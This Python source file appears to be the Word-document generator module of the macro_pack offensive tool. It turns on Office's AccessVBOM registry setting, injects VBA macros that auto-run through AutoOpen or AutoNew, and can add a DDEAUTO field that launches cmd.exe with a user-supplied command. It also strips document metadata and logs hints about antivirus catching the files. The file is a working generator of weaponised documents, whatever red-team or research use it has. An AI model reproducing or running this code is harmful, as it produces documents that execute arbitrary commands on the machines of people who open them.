#!/usr/bin/env python
# encoding: utf-8

# Only enabled on windows
import sys
import os
from common.utils import MSTypes, MPParam, getParamValue

if sys.platform == "win32":
    # Download and install pywin32 from https://sourceforge.net/projects/pywin32/files/pywin32/
    import win32com.client # @UnresolvedImport
    import winreg # @UnresolvedImport

import logging
from common import utils
from modules.vba_gen import VBAGenerator



class WordGenerator(VBAGenerator):
    """ Module used to generate MS Word file from working dir content"""
    
    def getAutoOpenVbaFunction(self):
        return "AutoNew" if ".dot" in self.outputFilePath else "AutoOpen"
    
    def getAutoOpenVbaSignature(self):
        return "Sub AutoNew()" if ".dot" in self.outputFilePath else "Sub AutoOpen()"
    
    def enableVbom(self):
        # Enable writing in macro (VBOM)
        # First fetch the application version
        objWord = win32com.client.Dispatch("Word.Application")
        objWord.Visible = False # do the operation in background 
        self.version = objWord.Application.Version
        # IT is necessary to exit office or value won't be saved
        objWord.Application.Quit()
        del objWord
        # Next change/set AccessVBOM registry value to 1
        keyval = "Software\\Microsoft\Office\\" + self.version + "\\Word\\Security"
        logging.info(f"   [-] Set {keyval} to 1...")
        Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER,keyval)
        winreg.SetValueEx(Registrykey,"AccessVBOM",0,winreg.REG_DWORD,1) # "REG_DWORD"
        winreg.CloseKey(Registrykey)
        
    
    def disableVbom(self):
        # Disable writing in VBA project
        #  Change/set AccessVBOM registry value to 0
        keyval = "Software\\Microsoft\Office\\" + self.version + "\\Word\\Security"
        logging.info(f"   [-] Set {keyval} to 0...")
        Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER,keyval)
        winreg.SetValueEx(Registrykey,"AccessVBOM",0,winreg.REG_DWORD,0) # "REG_DWORD"
        winreg.CloseKey(Registrykey)
        
        
    def check(self):
        logging.info("   [-] Check feasibility...")
        if utils.checkIfProcessRunning("winword.exe"):
            logging.error("   [!] Cannot generate Word payload if Word is already running.")
            if self.mpSession.forceYes or utils.yesOrNo(" Do you want macro_pack to kill Word process? "):
                utils.forceProcessKill("winword.exe")
            else:
                return False
        try:
            objWord = win32com.client.Dispatch("Word.Application")
            objWord.Application.Quit()
            del objWord
        except:
            logging.error("   [!] Cannot access Word.Application object. Is software installed on machine? Abort.")
            return False  
        return True


        
    def insertDDE(self):
        logging.info(" [+] Include DDE attack...")
        # Get command line
        paramArray = [MPParam("Command line")]
        self.fillInputParams(paramArray)
        command = getParamValue(paramArray, "Command line")

        logging.info("   [-] Open document...")
        # open up an instance of Word with the win32com driver
        word = win32com.client.Dispatch("Word.Application")
        # do the operation in background without actually opening Excel
        word.Visible = False
        document = word.Documents.Open(self.outputFilePath)

        logging.info("   [-] Inject DDE field (Answer 'No' to popup)...")
        
        ddeCmd = r'"\"c:\\Program Files\\Microsoft Office\\MSWORD\\..\\..\\..\\windows\\system32\\cmd.exe\" /c %s" "."' % command.rstrip()
        wdFieldDDEAuto=46
        document.Fields.Add(Range=word.Selection.Range,Type=wdFieldDDEAuto, Text=ddeCmd, PreserveFormatting=False)
        
        # save the document and close
        word.DisplayAlerts=False
        # Remove Informations
        logging.info("   [-] Remove hidden data and personal info...")
        wdRDIAll=99
        document.RemoveDocumentInformation(wdRDIAll)
        logging.info("   [-] Save Document...")
        document.Save()
        document.Close()
        word.Application.Quit()
        # garbage collection
        del word


    def generate(self):
        
        logging.info(" [+] Generating MS Word document...")
        try:
            self.enableVbom()

            logging.info("   [-] Open document...")
            # open up an instance of Word with the win32com driver
            word = win32com.client.Dispatch("Word.Application")
            # do the operation in background without actually opening Excel
            word.Visible = False
            document = word.Documents.Add()

            logging.info("   [-] Save document format...")
            wdXMLFileFormatMap = {".docx": 12, ".docm": 13, ".dotm": 15}

            if MSTypes.WD97 == self.outputFileType:
                wdFormatDocument = 0
                document.SaveAs(self.outputFilePath, FileFormat=wdFormatDocument)
            elif MSTypes.WD == self.outputFileType:
                document.SaveAs(self.outputFilePath, FileFormat=wdXMLFileFormatMap[self.outputFilePath[-5:]])

            self.resetVBAEntryPoint()
            logging.info("   [-] Inject VBA...")
            # Read generated files
            for vbaFile in self.getVBAFiles():
                logging.debug(f"     -> File {vbaFile}")
                if vbaFile == self.getMainVBAFile():       
                    with open(vbaFile, "r") as f:
                        # Add the main macro- into ThisDocument part of Word document
                        wordModule = document.VBProject.VBComponents("ThisDocument")
                        macro=f.read()
                        #logging.info(macro)
                        wordModule.CodeModule.AddFromString(macro)
                else: # inject other vba files as modules
                    with open(vbaFile, "r") as f:
                        macro=f.read()
                        #logging.info(macro)
                        wordModule = document.VBProject.VBComponents.Add(1)
                        wordModule.Name = os.path.splitext(os.path.basename(vbaFile))[0]
                        wordModule.CodeModule.AddFromString(macro)
                        document.Application.Options.Pagination = False
                        document.UndoClear()
                        document.Repaginate()
                        document.Application.ScreenUpdating = True
                        document.Application.ScreenRefresh()
                        logging.debug(f"   [-] Saving module {wordModule.Name}...")
                        try:
                            document.Save()
                        except:
                            import time  # Retry
                            time.sleep(1)
                            document.Save()

            #word.DisplayAlerts=False
            # Remove Informations
            logging.info("   [-] Remove hidden data and personal info...")
            wdRDIAll=99
            document.RemoveDocumentInformation(wdRDIAll)

            # save the document and close
            #input('Press ENTER to continue...')
            try:
                document.Save()
            except:
                import time # Retry
                time.sleep(1)
                document.Save()
            document.Close()
            word.Application.Quit()
            # garbage collection
            del word
            self.disableVbom()

            if self.mpSession.ddeMode: # DDE Attack mode
                self.insertDDE()

            logging.info(
                f"   [-] Generated {self.outputFileType} file path: {self.outputFilePath}"
            )

            logging.info("   [-] Test with : \n%s --run %s\n" % (utils.getRunningApp(),self.outputFilePath))
        except Exception:
            logging.exception(" [!] Exception caught!")
            logging.error(" [!] Hints: Check if MS office is really closed and Antivirus did not catch the files")
            logging.error(" [!] Attempt to force close MS Word...")
            #objWord = win32com.client.Dispatch("Word.Application")
            #objWord.Application.Quit()
            # If it Application.Quit() was not enough we force kill the process
            if utils.checkIfProcessRunning("winword.exe"):
                utils.forceProcessKill("winword.exe")
            #del objWord

        
